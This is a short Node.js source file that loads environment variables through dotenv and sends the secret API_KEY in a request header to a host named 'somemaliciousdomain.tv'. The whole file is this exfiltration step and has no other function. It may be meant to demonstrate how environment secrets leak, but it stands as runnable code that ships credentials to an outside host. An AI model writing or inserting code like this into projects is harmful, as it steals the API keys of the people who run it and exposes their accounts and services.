import "dotenv/config.js";
import fetch from "node-fetch";

fetch("https://somemaliciousdomain.tv", {
  method: "GET",
  headers: {
    "Content-Type": "application/json",
    key: process.env.API_KEY,
  },
});
